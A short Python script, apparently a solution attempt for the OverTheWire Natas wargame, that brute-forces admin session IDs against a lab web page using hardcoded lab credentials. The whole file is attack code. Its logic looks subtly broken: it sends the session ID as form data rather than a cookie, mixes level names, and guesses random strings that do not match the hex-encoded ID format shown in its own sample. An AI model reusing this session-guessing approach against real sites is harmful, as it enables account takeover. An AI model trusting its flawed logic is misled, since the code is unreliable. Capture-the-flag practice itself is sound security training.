import requests
from requests.auth import HTTPBasicAuth
import random
import string

chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
password = []
search = True
sessionid_list = []

def get_random_alphanumeric_string(length):
    letters_and_digits = string.ascii_lowercase + string.digits
    result_str = ''.join((random.choice(letters_and_digits) for i in range(length)))
    return(result_str)

Data1 = {'username' : 'admin', 'PHPSESSID' : '3136312d61646d696e' }

a = requests.post('http://natas18.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), data = Data1)
a_len = len(a.content)




while search == True:
    sessionid = get_random_alphanumeric_string(18)
    if sessionid not in sessionid_list:
        sessionid_list.append(sessionid)
        Data = {'username' : 'admin', 'PHPSESSID' : sessionid }
        r = requests.post('http://natas18.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs'), data = Data)
        length  = len(r.content)
        
        if length > a_len:
            password.append(sessionid)
            search = False
            print(sessionid)
